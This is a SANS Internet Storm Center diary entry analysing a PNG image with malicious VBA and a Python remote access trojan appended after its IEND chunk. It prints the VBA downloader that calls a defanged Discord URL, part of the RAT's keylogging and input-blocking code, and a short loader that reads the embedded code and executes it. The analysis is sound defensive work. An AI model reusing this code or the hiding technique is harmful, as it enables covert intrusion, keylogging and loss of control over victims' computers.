---
title: A PNG Image With an Embedded Gift, (Sat, May 31st)
url: https://isc.sans.edu/diary/rss/31998
source: SANS Internet Storm Center, InfoCON: green
date: 2025-06-01
fetch_date: 2025-10-06T22:53:32.651980
---

# A PNG Image With an Embedded Gift, (Sat, May 31st)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31994)
* [next](/diary/32000)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [A PNG Image With an Embedded Gift](/forums/diary/A%2BPNG%2BImage%2BWith%2Ban%2BEmbedded%2BGift/31998/)

**Published**: 2025-05-31. **Last Updated**: 2025-05-31 05:34:31 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/A%2BPNG%2BImage%2BWith%2Ban%2BEmbedded%2BGift/31998/#comments)

While hunting, I found an interesting picture. It's a PNG file that was concatenated with two interesting payloads. There are file formats that are good candidates to have data added at the end of the file. PNG is the case because the file format specifications says:

"*One notable restriction is that IHDR must appear first and IEND must appear last; thus the IEND chunk serves as an end-of-file marker.*"[[1](https://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html)]

All data after this "IEND" should be ignored by the program reading and rendering the picture. You can therefore append data to a PNG file with a simple command like this:

```

$ cat binary.png data.zip >image.png
$ xxd image.png |grep -A 3 -B 3 IEND
00000220: 6b33 4ddd 7857 677e 66a8 bdec 22f6 8ede  k3M.xWg~f..."...
00000230: 591e 022c 7097 b1f3 3978 860a b222 b99d  Y..,p...9x..."..
00000240: 9dd7 501c cc47 8870 b331 e000 0021 9019  ..P..G.p.1...!..
00000250: dd9b 8830 f200 0000 0049 454e 44ae 4260  ...0.....IEND.B`
00000260: 8250 4b03 040a 0000 0000 00cd 25bf 5aaf  .PK.........%.Z.
00000270: 4c9d 8100 0100 0000 0100 0007 001c 0064  L..............d
00000280: 6174 612e 677a 5554 0900 03a1 893a 68a7  ata.gzUT.....:h.
```

You can see the "IEND", its CRC (4 bytes) and then the magic bytes for a ZIP archive: "PK".

The picture I found seems to be a proof-of-concept and I don't know how it is dropped and processed on the victim's computer:

![](https://isc.sans.edu/diaryimages/images/isc-20250531-1.png)

This picture triggered a YARA rule because it has embedded VBA code and Python code!

The VBA code is split from the PNG with two dot characters (0x2E2E):

```

Set objShell = CreateObject("WScript.Shell") Set objEnv = objShell.Environment("User") strDirectory = objShell.ExpandEnvironmentStrings("%temp%") dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", "hxxps://media[.]discordapp[.]net/attachments/773993506615722064/798005313278050354/haly.png", False xHttp.Send with bStrm .type = 1 '//binary .open .write xHttp.responseBody .savetofile strDirectory + "\haly.png", 2 '//overwrite end with objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strDirectory + "\haly.png" objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
```

This code will updated the desktop wallpaper. Then, a Python RAT is also concatenated:

```

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())

    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
    ^M
    def keylogger(self):
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()

    def block_task_manager(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while (1):
                if block == True:
                    hwnd = user32.FindWindowW(0, "Task Manager")
                    user32.ShowWindow(hwnd, 0)
                    ctypes.windll.kernel32.Sleep(500)

    def disable_all(self):
        while True:
            user32.BlockInput(True)

    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600*24*11
        while time.time() < t_end and mousedbl == True:
            mouse.position = (0, 0)

    def disable_keyboard(self):
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
        time.sleep(999999)

    def execute(self):
        [...]
```

The file (SHA256:f014123c33b362df3549010ac8b37d7b28e002fc9264c54509ac8834b66e15ad) has a low VT score: 4/61, even if not obfuscated. This prooves that a simple concatenation of files helps to deliver malicious code. The payload can be easily extracted via a few lines of Python:

```

with open("malicious.png", "rb") as f:
    f.seek(216580) # Offset of Python code in the PNG file
    code = f.read().decode("utf-8")
exec(code)
```

[1] <https://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Steganography](/tag.html?tag=Steganography) [Embedded](/tag.html?tag=Embedded) [PNG](/tag.html?tag=PNG) [Python](/tag.html?tag=Python) [VBA](/tag.html?tag=VBA) [Malware](/tag.html?tag=Malware) [Payload](/tag.html?tag=Payload)

[0 comment(s)](/diary/A%2BPNG%2BImage%2BWith%2Ban%2BEmbedded%2BGift/31998/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31994)
* [next](/diary/32000)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)